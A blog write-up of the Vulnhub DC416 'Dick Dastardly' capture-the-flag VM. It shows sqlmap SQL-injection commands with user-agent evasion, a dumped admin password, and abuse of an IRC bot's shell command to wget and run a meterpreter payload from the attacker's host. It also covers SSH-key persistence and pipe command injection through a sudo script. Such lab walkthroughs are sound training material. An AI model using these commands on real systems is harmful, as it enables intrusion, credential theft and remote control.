+++
Description = "Vulnhub - DC416: Dick Dastardly Writeup"
title = "Vulnhub - DC416: Dick Dastardly Writeup"
date = "2017-01-10T23:00:00+01:00"
metakeys = ["vulnhub", "walkthrough", "writeup", "DC416", "dickdastardly", "dick dastardly"]
image = "/img/misc/vulnhub.png"
+++

New evening, new VM: [DC416 Dick Dastardly](https://www.vulnhub.com/entry/dc416-2016,168/) by the famous [@\_RastaMouse](https://twitter.com/_RastaMouse).

<!--more-->

Here are my other writeups for the DC416 challenges:

- [DC416 Basement](/post/vulnhub_dc416_basement/)
- [DC416 Baffle](/post/vulnhub_dc416_baffle/)
- [DC416 Fortress](/post/vulnhub_dc416_fortress/)

# information gathering

As every DC416 VM there is an information page hosted on port 80 with informations about it:

```
Engagement Rules:

No username/password bruteforcing is necessary
This box has 4 flags
Flags are in flag{} format
Have fun
```

So let's start with a nmap scan:

```
root@kali:~# nmap -sS -A -p- -T4 192.168.56.2
Not shown: 65532 closed ports
PORT     STATE    SERVICE VERSION
22/tcp   open     ssh     OpenSSH 6.6.1p1 Ubuntu 2ubuntu2.8 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   1024 03:26:f5:54:5b:15:37:ef:18:7e:08:cb:17:99:f3:16 (DSA)
|   2048 38:98:af:53:dd:59:c4:a6:8e:a3:71:61:79:39:a5:ee (RSA)
|_  256 4b:5e:ba:46:af:0f:75:dc:3d:2d:49:03:34:56:0c:31 (ECDSA)
80/tcp   open     http    Apache httpd 2.4.7 ((Ubuntu))
|_http-server-header: Apache/2.4.7 (Ubuntu)
|_http-title: VulnHub
6667/tcp filtered irc
```

We can see a filtered IRC port, SSH and an Apache Webserver.

# flag1

The first flag can be found by simply inspecting the HTTP headers returned from the webserver on port 80.

```
root@kali:~# curl -skI 192.168.56.2
HTTP/1.1 200 OK
Date: Sun, 08 Jan 2017 21:48:34 GMT
Server: Apache/2.4.7 (Ubuntu)
Last-Modified: Mon, 17 Oct 2016 16:04:49 GMT
ETag: "1eb-53f11bc50cf74"
Accept-Ranges: bytes
Content-Length: 491
Vary: Accept-Encoding
Flag: flag1{l0l_h0w_345y_15_7h15_c7f}
Content-Type: text/html
```

# flag2

By running nikto against the target we can see some requests return a PHP HTTP header so there must be a PHP application somewhere on the Server.

```
+ Retrieved x-powered-by header: PHP/5.5.9-1ubuntu4.20
```

So let's run `dirb` against the target and also check for files with an `.php` extension:

```
root@kali:~# dirb http://192.168.56.2/ /usr/share/wordlists/dirb/big.txt -X .php
-----------------
GENERATED WORDS: 20458
---- Scanning URL: http://192.168.56.2/ ----
+ http://192.168.56.2/admin.php (CODE:302|SIZE:0)
+ http://192.168.56.2/db.php (CODE:200|SIZE:0)
+ http://192.168.56.2/index.php (CODE:200|SIZE:647974)
+ http://192.168.56.2/report.php (CODE:200|SIZE:527)
-----------------
```

After opening `index.php` in a browser we see a simple guestbook application and a feature to report issues under `report.php`.

![Admin Login](/img/vulnhub_dc416_dick_dastardly/admin_login.png)

By playing around with the parameters of the guestbook to see if it's vulnerable to XSS it seems that there is some filtering and escaping in place. So let's try `sqlmap` and see if it can find any SQL-Injection vulnerabilities.

```
sqlmap -u http://192.168.56.2/index.php --data "name=asd&msg=asd" --level=5 --risk=3 --batch
```

After running this command I could not see any new entries on the guestbook page so it looks like all requests were blocked. `sqlmap` sends it's own user agent on every request containing the tool name so maybe the server is blocking these requests. The user agent can be randomized with the `--random-agent` option so let's give it another try:

```
sqlmap -u http://192.168.56.2/index.php --data "name=asd&msg=asd" --level=5 --risk=3 --random-agent --batch
```

Bingo:

```
sqlmap identified the following injection point(s) with a total of 7776 HTTP(s) requests:
---
Parameter: name (POST)
    Type: AND/OR time-based blind
    Title: MySQL >= 5.0.12 AND time-based blind
    Payload: name=asd'||(SELECT 'RbDO' FROM DUAL WHERE 4795=4795 AND SLEEP(5))||'&msg=asd
---
```

Let's also test the `report.php` file for SQL-Injection issues:

```
sqlmap -u http://192.168.56.2/report.php --data="issue=asdf" --random-agent --level=5 --risk=3
```

```
sqlmap identified the following injection point(s) with a total of 142 HTTP(s) requests:
---
Parameter: issue (POST)
    Type: boolean-based blind
    Title: AND boolean-based blind - WHERE or HAVING clause
    Payload: issue=asdf'||(SELECT 'oYQt' FROM DUAL WHERE 9026=9026 AND 7350=7350)||'

    Type: AND/OR time-based blind
    Title: MySQL >= 5.0.12 AND time-based blind
    Payload: issue=asdf'||(SELECT 'RdBC' FROM DUAL WHERE 9919=9919 AND SLEEP(5))||'
---
```

So we have found 2 time based and one boolean based blind injection. We will use the vulnerability in `report.php` to dump the database as the boolean based blind attack is a lot faster then the time based attack.

So let's enumerate the available DBs using the `--dbs` parameter:

```
available databases [4]:
[*] information_schema
[*] mysql
[*] performance_schema
[*] vulnhub
```

Now let's look at the `vulnhub` database with `-D vulnhub --tables`:

```
Database: vulnhub
[3 tables]
+----------------------------------------------+
| admins                                       |
| guestbook                                    |
| issues                                       |
+----------------------------------------------+
```

Then dump the admins table with `-D vulnhub -T admins --dump`

```
Database: vulnhub
Table: admins
[1 entry]
+----+--------------------------------------+--------+
| id | pass                                 | user   |
+----+--------------------------------------+--------+
| 1  | 1b37y0uc4n76u3557h15p455w0rd,5uck3rz | rasta  |
+----+--------------------------------------+--------+
```

Yay! So we found the clear text password of `rasta` (even if it looks like md5 ;D ).

Using the new login we can login on the web application and are presented with an admin application for the IRC server.

![Admin Area](/img/vulnhub_dc416_dick_dastardly/admin_area.png)

First we try to `Add IP to IRC whitelist` and see if this opens the IRC port for us. Success.

```
6667/tcp open  irc     IRCnet ircd
| irc-info:
|   users: 1
|   servers: 1
|   chans: 15
|   lusers: 1
|   lservers: 0
|   server: irc.localhost
|   version: 2.11.2p2. irc.localhost 000A
|   uptime: 0 days, 0:53:58
|   source ident: NONE or BLOCKED
|   source host: 192.168.56.3
|_  error: Closing Link: jgjxeujeu[~nmap@192.168.56.3] ("")
```

We also have an option to add an `Supybot Owner` so lets add the user `test` with the password `test` but nothing happens. So we try to activate the `Supybot` and have a look at the IRC server.

I installed `weechat` on my kali vm, started it and configured it the following way:

```
/server add vulnhub 192.168.56.2
/connect vulnhub
```

By using `/list` we can get a list of all channels

```
21:10:08 vulnhub  -- | #vulnhub(1)
21:10:08 vulnhub  -- | &WALLOPS(1): SERVER MESSAGES: wallops received
21:10:08 vulnhub  -- | &SAVE(1): SERVER MESSAGES: save messages
21:10:08 vulnhub  -- | &AUTH(1): SERVER MESSAGES: messages from the authentication slave
21:10:08 vulnhub  -- | &SERVICES(1): SERVER MESSAGES: services joining and leaving
21:10:08 vulnhub  -- | &LOCAL(1): SERVER MESSAGES: notices about local connections
21:10:08 vulnhub  -- | &HASH(1): SERVER MESSAGES: hash tables growth
21:10:08 vulnhub  -- | &SERVERS(1): SERVER MESSAGES: servers joining and leaving
21:10:08 vulnhub  -- | &NUMERICS(1): SERVER MESSAGES: numerics received
21:10:08 vulnhub  -- | &CHANNEL(1): SERVER MESSAGES: fake modes
21:10:08 vulnhub  -- | &KILLS(1): SERVER MESSAGES: operator and server kills
21:10:08 vulnhub  -- | &NOTICES(1): SERVER MESSAGES: warnings and notices
21:10:08 vulnhub  -- | &ERRORS(1): SERVER MESSAGES: server errors
21:10:08 vulnhub  -- | End of LIST
```

So let's join the `#vulnhub` channel with `/join #vulnhub`. We are seeing a user named `vulnhub-bot` which seems to be the bot we activated on the admin interface.

We can now query the user to start a private conversation with it by issuing `/query vulnhub-bot`. After writing something we get the message

```
vulnhub-bot: Error: "test" is not a valid command.
```

By trying `help` we get a help menu:

```
21:21:00   -- | vulnhub-bot: (help [<plugin>] [<command>]) -- This command gives a useful description of what <command> does. <plugin> is only necessary if the command is in more than one plugin. You may also
              | want to use the 'list' command to list all available plugins and commands.
```

So let's execute the mentioned `list` command:

```
21:21:13   -- | vulnhub-bot: Admin, AutoMode, Channel, Config, Misc, NickAuth, Owner, Unix, User, and Utilities
```

By looking at all the plugins in detail a `list Unix` reveals a `shell` method:

```
21:22:20   -- | vulnhub-bot: call, crypt, errno, fortune, pid, ping, ping6, progstats, shell, spell, sysuname, sysuptime, and wtf
```

So let's try the `shell` command:

```
22:25:16 root | Unix shell
22:25:17   -- | vulnhub-bot: Error: You don't have the owner capability. If you think that you should have this capability, be sure that you are identified before trying again. The 'whoami' command can tell you
              | if you're identified.
```

Crap, so `whoami`?

```
21:22:44 root | whoami
21:22:44   -- | vulnhub-bot: I don't recognize you. You can message me either of these two commands: "user identify <username> <password>" to log in or "user register <username> <password>" to register.
```

Ok let's try the credentials from the user we added in the admin dialog:

```
21:23:16 root | user identify test test
21:23:16   -- | vulnhub-bot: The operation succeeded.
21:23:19 root | shell
21:23:20   -- | vulnhub-bot: (shell <command to call with any arguments>) -- Calls any command available on the system using the shell specified by the SHELL environment variable, and returns its output.
              | Requires owner capability. Note that being restricted to owner, this command does not do any sanity checking on input/output. So it is up to you to make sure you don't run anything that will
              | spamify your channel or that will bring your (1 more message)
```

So let's download a meterpreter shell and start it:

```
shell "/usr/bin/rm -f /tmp/meterpreter ; /usr/bin/wget -O /tmp/meterpreter http://192.168.56.3/meterpreter ; chmod +x /tmp/meterpreter; /tmp/meterpreter"
```

```
meterpreter > sysinfo
Computer     : 192.168.56.2
OS           : Ubuntu 14.04 (Linux 3.13.0-101-generic)
Architecture : x64
Meterpreter  : x86/linux
```

Now we can get the next flag

```
cat flag2
flag2{y0u'r3_4_5upyb07_n00b_m8}
```

Let's also add a SSH key to the `authorized_keys` so we can have a look with a proper shell as the user `rasta`

```
mkdir ~/.ssh
echo "ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQCyXvfW0bhRfSIPDn6kHkn8qggMuDKTTMJEFweBWv7qJ5FKB+QbmfsjASOQPZBIsc6248pCUm3yfzfvRAUyXICD4Dcsz+Zex9TAKJFLc4W6dglZlEchOqFKWE8bpWHgzf4shFh/2/utcWtAxMJb+5+uYGyATBtjWeB3BsLVGaB3djow6ymxdl/V40qR/xOzfoO2U2mDJrG8iYPVkSHs2Rcfu0vnEb5XOWZ7qvhUgrmh/c/M5kNjH6f5/KJJkKXAfcMDwRV81EpznNOD2ddJxXBzgzpYU5zx21GDrTQE76N5NJR9L9ePtorVHWDAn8bfKo7K3Y2n4LjO8wL/cFVlXdd/ root@kali" > ~/.ssh/authorized_keys
```

# flag3

After having a look at the users sudo rights we can see we are allowed to run a python script as the user `vulnhub`:

```
rasta@DickDastardly:/home$ sudo -l
Matching Defaults entries for rasta on DickDastardly:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin

User rasta may run the following commands on DickDastardly:
    (vulnhub) NOPASSWD: /usr/bin/python /usr/local/sbin/util.py
```

So let's try it out:

```
sudo -u vulnhub /usr/bin/python /usr/local/sbin/util.py
```

We get the `Admin Helper` application:

```
 ----------------
|  Admin Helper  |
|	dev 0.1  |
 ----------------

1 whoami
2 List Directory
3 Coffee
q Exit
```

With option 2 we are able to list any directory and it's also the only option accepting additional user input:

```
Please Select: 2

Enter dir to list: /home/vulnhub/
total 4
-rw-r--r-- 1 root root 37 Sep 26 16:59 flag3
```

So maybe we can inject some commands here? After trying out various ways I noticed it is possible to execute commands with the `|` character:

```
Enter dir to list: / | id
uid=1000(vulnhub) gid=1000(vulnhub) groups=1000(vulnhub)
```

Let's start the previously uploaded `meterpreter` again and watch a new connection coming in as the user `vulnhub`:

```
Enter dir to list: / | /tmp/meterpreter
```

Now we can get the next flag:

```
cat flag3
flag3{n3x7_71m3_54n17153_y0ur_1npu7}
```

We can again add our SSH key to the user to get a better way to look at the machine.

# flag0

After examining the output of `ps faux` there is a `ping` command running as `root`:

```
root      1046  0.0  0.1  17976  1480 ?        S    20:08   0:00 /bin/bash /root/ping.sh 2
root      5463  0.0  0.0   6500   632 ?        S    21:44   0:00  \_ ping -c 1 -b 192.168.56.255 -p 725f796f755f6265636f6d655f746865 2
```

Decoding the data as hex reveals

```
>>> "725f796f755f6265636f6d655f746865".decode("hex")
'r_you_become_the'
```

So this looks like the part of our flag. After looking at the process list again we can see the data portion of the ping command changes regularly.

After extracting all values manually we can decode the last flag:

```
666c6167307b7468655f717569657465
725f796f755f6265636f6d655f746865
5f6d6f72655f796f755f6172655f6162
6c655f746f5f686561727d

>>> "666c6167307b7468655f717569657465725f796f755f6265636f6d655f7468655f6d6f72655f796f755f6172655f61626c655f746f5f686561727d".decode("hex")
'flag0{the_quieter_you_become_the_more_you_are_able_to_hear}'
```

# flags

The flags:

```
flag0{the_quieter_you_become_the_more_you_are_able_to_hear}
flag1{l0l_h0w_345y_15_7h15_c7f}
flag2{y0u'r3_4_5upyb07_n00b_m8}
flag3{n3x7_71m3_54n17153_y0ur_1npu7}
```
